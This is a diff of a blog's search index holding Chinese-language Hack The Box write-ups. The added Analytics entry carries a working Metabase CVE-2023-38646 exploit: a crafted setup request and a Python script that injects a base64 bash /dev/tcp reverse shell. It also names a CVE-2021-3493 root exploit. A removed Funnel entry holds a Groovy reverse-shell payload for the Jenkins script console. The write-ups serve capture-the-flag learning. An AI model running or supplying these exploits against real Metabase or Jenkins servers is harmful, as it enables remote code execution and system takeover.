@@ -1,6 +1,62 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>HTB-Analytics</title>
+    <url>/Analytics.html</url>
+    <content><![CDATA[<h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><ul>
+<li>端口扫描</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -sC -Pn 10.129.49.233</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/10/09/q9CrbujfPApQ7mv.png" alt="image-20231009103121014"></p>
+<ul>
+<li><p>修改&#x2F;etc&#x2F;hosts文件，访问80端口。点击login发现子域名，修改hosts文件</p>
+<p><img src="https://s2.loli.net/2023/10/09/WJv69rYsogAqON4.png" alt="image-20231009103235685"></p>
+</li>
+<li><p>访问data.analytical.htb，发现系统位Metabase。网上搜索相关漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#最新漏洞</span><br><span class="line">Metabase未授权JDBC远程代码执行漏洞（CVE-2023-38646）</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
+<li><p>获取setup-token</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/session/properties HTTP/1.1</span><br><span class="line">Host: data.analytical.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: metabase.DEVICE=4e65217f-acee-439c-b55d-b60cf2fa539e</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Mon, 9 Oct 2023 02:32:42 GMT</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/10/09/dLYerpafMmOFPQJ.png" alt="image-20231009141419632"></p>
+</li>
+<li><p>发送漏洞利用数据包（这里利用本地python的web服务来探测漏洞是否存在）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/setup/validate HTTP/1.1</span><br><span class="line">Host: data.analytical.htb</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 743</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    &quot;token&quot;: &quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;,</span><br><span class="line"></span><br><span class="line">    &quot;details&quot;:</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        &quot;is_on_demand&quot;: false,</span><br><span class="line"></span><br><span class="line">        &quot;is_full_sync&quot;: false,</span><br><span class="line"></span><br><span class="line">        &quot;is_sample&quot;: false,</span><br><span class="line"></span><br><span class="line">        &quot;cache_ttl&quot;: null,</span><br><span class="line"></span><br><span class="line">        &quot;refingerprint&quot;: false,</span><br><span class="line"></span><br><span class="line">        &quot;auto_run_queries&quot;: true,</span><br><span class="line"></span><br><span class="line">        &quot;schedules&quot;:</span><br><span class="line"></span><br><span class="line">        &#123;&#125;,</span><br><span class="line"></span><br><span class="line">        &quot;details&quot;:</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;&quot;,</span><br><span class="line"></span><br><span class="line">            &quot;advanced-options&quot;: false,</span><br><span class="line"></span><br><span class="line">            &quot;ssl&quot;: true,</span><br><span class="line"></span><br><span class="line">&quot;init&quot;: &quot;CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec(&#x27;curl http://10.10.14.6&#x27;)\u000A$$&quot;</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        &quot;name&quot;: &quot;an-sec-research-team&quot;,</span><br><span class="line"></span><br><span class="line">        &quot;engine&quot;: &quot;h2&quot;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="https://s2.loli.net/2023/10/09/wTpeub2vliY7WyA.png" alt="image-20231009141303050"></p>
+<ul>
+<li><p>利用python脚本反弹shell</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_setup_token_and_version</span>(<span class="params">ip_address</span>):</span><br><span class="line">    endpoint = <span class="string">&quot;/api/session/properties&quot;</span></span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;ip_address&#125;</span><span class="subst">&#123;endpoint&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Fetching setup token from <span class="subst">&#123;url&#125;</span>...&quot;</span>)</span><br><span class="line">        response = requests.get(url, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            data = response.json()</span><br><span class="line">            setup_token = data.get(<span class="string">&quot;setup-token&quot;</span>)</span><br><span class="line">            metabase_version = data.get(<span class="string">&quot;version&quot;</span>, &#123;&#125;).get(<span class="string">&quot;tag&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> setup_token <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Setup token not found or is null for IP: <span class="subst">&#123;ip_address&#125;</span>\n&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Setup Token: <span class="subst">&#123;setup_token&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Version: <span class="subst">&#123;metabase_version&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> setup_token</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Exception occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Failed to connect to <span class="subst">&#123;ip_address&#125;</span>.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_setup_validate</span>(<span class="params">ip_address, setup_token, listener_ip, listener_port</span>):</span><br><span class="line">    payload = base64.b64encode(<span class="string">f&quot;bash -i &gt;&amp;/dev/tcp/<span class="subst">&#123;listener_ip&#125;</span>/<span class="subst">&#123;listener_port&#125;</span> 0&gt;&amp;1&quot;</span>.encode()).decode()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Payload = <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    endpoint = <span class="string">&quot;/api/setup/validate&quot;</span></span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;ip_address&#125;</span><span class="subst">&#123;endpoint&#125;</span>&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: setup_token,</span><br><span class="line">        <span class="string">&quot;details&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;is_on_demand&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&quot;is_full_sync&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&quot;is_sample&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&quot;cache_ttl&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;refingerprint&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&quot;auto_run_queries&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;schedules&quot;</span>: &#123;&#125;,</span><br><span class="line">            <span class="string">&quot;details&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;db&quot;</span>: <span class="string">f&quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#x27;bash -c &#123;&#123;echo,<span class="subst">&#123;payload&#125;</span>&#125;&#125;|&#123;&#123;base64,-d&#125;&#125;|&#123;&#123;bash,-i&#125;&#125;&#x27;)\n$$--=x&quot;</span>,</span><br><span class="line">                <span class="string">&quot;advanced-options&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;ssl&quot;</span>: <span class="literal">True</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">            <span class="string">&quot;engine&quot;</span>: <span class="string">&quot;h2&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Sending request to <span class="subst">&#123;url&#125;</span> with headers <span class="subst">&#123;headers&#125;</span> and data <span class="subst">&#123;json.dumps(data, indent=<span class="number">4</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, headers=headers, json=data, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Response received: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] POST to <span class="subst">&#123;url&#125;</span> successful.\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] POST to <span class="subst">&#123;url&#125;</span> failed with status code: <span class="subst">&#123;response.status_code&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Exception occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Failed to connect to <span class="subst">&#123;url&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">preprocess_url</span>(<span class="params">user_input</span>):</span><br><span class="line">    parsed_url = urlparse(user_input)</span><br><span class="line">    protocol = <span class="string">f&quot;<span class="subst">&#123;parsed_url.scheme&#125;</span>://&quot;</span> <span class="keyword">if</span> parsed_url.scheme <span class="keyword">else</span> <span class="string">&quot;http://&quot;</span></span><br><span class="line">    netloc = parsed_url.netloc <span class="keyword">or</span> parsed_url.path</span><br><span class="line">    <span class="keyword">return</span> protocol + netloc.rstrip(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Check setup token&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--rhost&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;Metabase server IP address (including http:// or https:// and port number if needed)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--lhost&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;Listener IP address&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--lport&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">4444</span>, <span class="built_in">help</span>=<span class="string">&#x27;Listener port (default is 4444)&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Original rhost: <span class="subst">&#123;args.rhost&#125;</span>&quot;</span>)</span><br><span class="line">    args.rhost = preprocess_url(args.rhost)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Preprocessed rhost: <span class="subst">&#123;args.rhost&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Input Arguments - rhost: <span class="subst">&#123;args.rhost&#125;</span>, lhost: <span class="subst">&#123;args.lhost&#125;</span>, lport: <span class="subst">&#123;args.lport&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    setup_token = get_setup_token_and_version(args.rhost)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Setup token: <span class="subst">&#123;setup_token&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> setup_token:</span><br><span class="line">        post_setup_validate(args.rhost, setup_token, args.lhost, args.lport)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/10/09/BWM8kEemjlDnrf3.png" alt="image-20231009142722336"></p>
+</li>
+<li><p>查看文件，发现.dockerenv文件。可能是docker环境，使用env查看</p>
+<p><img src="https://s2.loli.net/2023/10/09/5TFcel23hgotZfp.png" alt="image-20231009154513176"></p>
+<p><img src="https://s2.loli.net/2023/10/09/yUNHEeIcOg1rTYj.png" alt="image-20231009154444468"></p>
+</li>
+<li><p>前面信息搜集时，22端口是开放的。尝试使用ssh登录metalytics用户</p>
+<p><img src="https://s2.loli.net/2023/10/09/jaynPp2ldtQmRwY.png" alt="image-20231009154742391"></p>
+</li>
+</ul>
+<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><ul>
+<li><p>使用CVE-2021-3493提权成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载地址</span><br><span class="line">https://github.com/briskets/CVE-2021-3493</span><br><span class="line">#编译</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">#上传到靶机，给予执行权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/10/09/yiOKPwAm5kRlF7D.png" alt="image-20231009164211662"></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>HTB</category>
+      </categories>
+      <tags>
+        <tag>Open Beat SeasonIII</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-ArcheType</title>
     <url>/HTB-ArcheType.html</url>
     <content><![CDATA[<h5 id="一、哪一个TCP端口托管数据库服务器？"><a href="#一、哪一个TCP端口托管数据库服务器？" class="headerlink" title="一、哪一个TCP端口托管数据库服务器？"></a>一、哪一个TCP端口托管数据库服务器？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV  10.129.186.174</span><br><span class="line">namp -sV -sC 10.129.186.174</span><br></pre></td></tr></table></figure>
@@ -68,31 +124,6 @@
       </categories>
       <tags>
         <tag>HTB-ArcheType</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB-Emdee five for life</title>
-    <url>/HTB-Emdee%20five%20for%20life.html</url>
-    <content><![CDATA[<h5 id="访问靶机地址"><a href="#访问靶机地址" class="headerlink" title="访问靶机地址"></a>访问靶机地址</h5><p><img src="https://s2.loli.net/2023/04/25/aEwWOZqpAk4MiuU.png" alt="image-20230421172531319"></p>
-<h5 id="题目提示是使用MD5加密字符串，提交后显示速度太慢"><a href="#题目提示是使用MD5加密字符串，提交后显示速度太慢" class="headerlink" title="题目提示是使用MD5加密字符串，提交后显示速度太慢"></a>题目提示是使用MD5加密字符串，提交后显示速度太慢</h5><p>解题思路，使用python脚本代替手工提交</p>
-<ul>
-<li>获取网页中的string字符串</li>
-<li>MD5加密字符串</li>
-<li>提交加密后的数据</li>
-</ul>
-<h5 id="python代码"><a href="#python代码" class="headerlink" title="python代码"></a>python代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@author ZPast0r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> selectolax.parser <span class="keyword">import</span> HTMLParser</span><br><span class="line"><span class="comment"># 网站地址</span></span><br><span class="line">url = <span class="string">&#x27;http://161.35.36.167:32078&#x27;</span></span><br><span class="line">r = requests.session()</span><br><span class="line">html = r.get(url)</span><br><span class="line">text = html.text</span><br><span class="line">tree = HTMLParser(text)</span><br><span class="line"><span class="keyword">for</span> node  <span class="keyword">in</span> tree.css(<span class="string">&quot;h3&quot;</span>):</span><br><span class="line">    MD5 = node.text(strip=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(MD5)</span><br><span class="line">final = hashlib.md5(MD5.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">data = &#123;<span class="string">&#x27;hash&#x27;</span>:final&#125;</span><br><span class="line">posthtml = r.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(posthtml.text)</span><br></pre></td></tr></table></figure>
-
-<h5 id="运行python脚本，得到flag"><a href="#运行python脚本，得到flag" class="headerlink" title="运行python脚本，得到flag"></a>运行python脚本，得到flag</h5><p><img src="https://s2.loli.net/2023/04/25/7IouOetkFxfhBN8.png" alt="image-20230421173053276"></p>
-<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
-<li>可以使用正则表达式提取flag字段</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>HTB</category>
-      </categories>
-      <tags>
-        <tag>HTB-Emdee five for life</tag>
       </tags>
   </entry>
   <entry>
@@ -227,6 +258,31 @@
       </categories>
       <tags>
         <tag>HTB-Explosion</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB-Emdee five for life</title>
+    <url>/HTB-Emdee%20five%20for%20life.html</url>
+    <content><![CDATA[<h5 id="访问靶机地址"><a href="#访问靶机地址" class="headerlink" title="访问靶机地址"></a>访问靶机地址</h5><p><img src="https://s2.loli.net/2023/04/25/aEwWOZqpAk4MiuU.png" alt="image-20230421172531319"></p>
+<h5 id="题目提示是使用MD5加密字符串，提交后显示速度太慢"><a href="#题目提示是使用MD5加密字符串，提交后显示速度太慢" class="headerlink" title="题目提示是使用MD5加密字符串，提交后显示速度太慢"></a>题目提示是使用MD5加密字符串，提交后显示速度太慢</h5><p>解题思路，使用python脚本代替手工提交</p>
+<ul>
+<li>获取网页中的string字符串</li>
+<li>MD5加密字符串</li>
+<li>提交加密后的数据</li>
+</ul>
+<h5 id="python代码"><a href="#python代码" class="headerlink" title="python代码"></a>python代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@author ZPast0r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> selectolax.parser <span class="keyword">import</span> HTMLParser</span><br><span class="line"><span class="comment"># 网站地址</span></span><br><span class="line">url = <span class="string">&#x27;http://161.35.36.167:32078&#x27;</span></span><br><span class="line">r = requests.session()</span><br><span class="line">html = r.get(url)</span><br><span class="line">text = html.text</span><br><span class="line">tree = HTMLParser(text)</span><br><span class="line"><span class="keyword">for</span> node  <span class="keyword">in</span> tree.css(<span class="string">&quot;h3&quot;</span>):</span><br><span class="line">    MD5 = node.text(strip=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(MD5)</span><br><span class="line">final = hashlib.md5(MD5.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">data = &#123;<span class="string">&#x27;hash&#x27;</span>:final&#125;</span><br><span class="line">posthtml = r.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(posthtml.text)</span><br></pre></td></tr></table></figure>
+
+<h5 id="运行python脚本，得到flag"><a href="#运行python脚本，得到flag" class="headerlink" title="运行python脚本，得到flag"></a>运行python脚本，得到flag</h5><p><img src="https://s2.loli.net/2023/04/25/7IouOetkFxfhBN8.png" alt="image-20230421173053276"></p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
+<li>可以使用正则表达式提取flag字段</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>HTB</category>
+      </categories>
+      <tags>
+        <tag>HTB-Emdee five for life</tag>
       </tags>
   </entry>
   <entry>
@@ -690,42 +746,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB-Funnel</title>
-    <url>/HTB-PennyWorth.html</url>
-    <content><![CDATA[<h5 id="一、首字母缩略词-CVE-代表什么？"><a href="#一、首字母缩略词-CVE-代表什么？" class="headerlink" title="一、首字母缩略词 CVE 代表什么？"></a>一、首字母缩略词 CVE 代表什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Common Vulnerabilities and Exposures</span><br></pre></td></tr></table></figure>
-
-<h5 id="二、在网络安全中，CIA指的是什么？"><a href="#二、在网络安全中，CIA指的是什么？" class="headerlink" title="二、在网络安全中，CIA指的是什么？"></a>二、在网络安全中，CIA指的是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#信息安全三要素，机密性，完整性，可用性</span><br><span class="line">Confidentiality, Integrity, Availability</span><br></pre></td></tr></table></figure>
-
-<h5 id="三、端口-8080-上运行的服务版本是什么？"><a href="#三、端口-8080-上运行的服务版本是什么？" class="headerlink" title="三、端口 8080 上运行的服务版本是什么？"></a>三、端口 8080 上运行的服务版本是什么？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap扫描IP</span></span><br><span class="line">nmap -sC -sV IP</span><br><span class="line">Jetty 9.4.39.v20210325</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/23/43XgzIN5pmVcS6y.png" alt="image-20230314154438068"></p>
-<h5 id="四、目标上运行的是哪个版本的-Jenkins？"><a href="#四、目标上运行的是哪个版本的-Jenkins？" class="headerlink" title="四、目标上运行的是哪个版本的 Jenkins？"></a>四、目标上运行的是哪个版本的 Jenkins？</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用curl命令或者目录爆破</span></span><br><span class="line">curl -v http://ip:port</span><br><span class="line">2.289.1</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/14/YhOJpnQGUvFPVXa.png" alt="image-20230314154831206"></p>
-<h5 id="五、什么类型的脚本在-Jenkins-脚本控制台上被接受为输入？"><a href="#五、什么类型的脚本在-Jenkins-脚本控制台上被接受为输入？" class="headerlink" title="五、什么类型的脚本在 Jenkins 脚本控制台上被接受为输入？"></a>五、什么类型的脚本在 Jenkins 脚本控制台上被接受为输入？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Groovy是一种基于Java平台的面向对象语言。</span><br><span class="line">groovy</span><br></pre></td></tr></table></figure>
-
-<h5 id="六、如果目标虚拟机运行的是Windows，Groovy-脚本代码段中的“String-cmd”变量等于什么？"><a href="#六、如果目标虚拟机运行的是Windows，Groovy-脚本代码段中的“String-cmd”变量等于什么？" class="headerlink" title="六、如果目标虚拟机运行的是Windows，Groovy 脚本代码段中的“String cmd”变量等于什么？"></a>六、如果目标虚拟机运行的是Windows，Groovy 脚本代码段中的“String cmd”变量等于什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd.exe</span><br></pre></td></tr></table></figure>
-
-<h5 id="七、与我们可以用来在-Linux-上显示网络接口信息的“ip-a”有什么不同的命令？"><a href="#七、与我们可以用来在-Linux-上显示网络接口信息的“ip-a”有什么不同的命令？" class="headerlink" title="七、与我们可以用来在 Linux 上显示网络接口信息的“ip a”有什么不同的命令？"></a>七、与我们可以用来在 Linux 上显示网络接口信息的“ip a”有什么不同的命令？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-
-<h5 id="八、哪个开关可以让我们在netcat-上使用UDP传输模式？"><a href="#八、哪个开关可以让我们在netcat-上使用UDP传输模式？" class="headerlink" title="八、哪个开关可以让我们在netcat 上使用UDP传输模式？"></a>八、哪个开关可以让我们在netcat 上使用UDP传输模式？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u</span><br></pre></td></tr></table></figure>
-
-<h5 id="九、用于描述使目标主机启动与攻击者主机的连接的术语是什么？"><a href="#九、用于描述使目标主机启动与攻击者主机的连接的术语是什么？" class="headerlink" title="九、用于描述使目标主机启动与攻击者主机的连接的术语是什么？"></a>九、用于描述使目标主机启动与攻击者主机的连接的术语是什么？</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reverse shell</span><br></pre></td></tr></table></figure>
-
-<h5 id="十、提交root-flag"><a href="#十、提交root-flag" class="headerlink" title="十、提交root flag"></a>十、提交root flag</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用burp进行用户名，密码爆破</span></span><br><span class="line">root，password</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在manage-script-console中写入payload</span></span><br><span class="line">String host=&quot;IP&quot;;</span><br><span class="line">int port=4444;</span><br><span class="line">String cmd=&quot;/bin/bash&quot;;</span><br><span class="line">Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) &#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read()); while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">升级为ttyshell</span></span><br><span class="line">SHELL=/bin/bash script -q /dev/null</span><br><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/03/23/iEfu9mUoxzKHC8O.png" alt="image-20230314170911498"></p>
-<p><img src="https://s2.loli.net/2023/03/23/heHuyG9Vbf8dacm.png" alt="image-20230314224013599"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>HTB</category>
-      </categories>
-      <tags>
-        <tag>HTB-Funnel</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB-Netmon</title>
     <url>/HTB-Netmon.html</url>
     <content><![CDATA[<h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><p>使用nmap对靶机IP进行扫描，目标开放21，80，135，139，445，操作系统为Windows Server</p>
@@ -776,6 +796,42 @@
       </categories>
       <tags>
         <tag>HTB-Netmon</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB-Funnel</title>
+    <url>/HTB-PennyWorth.html</url>
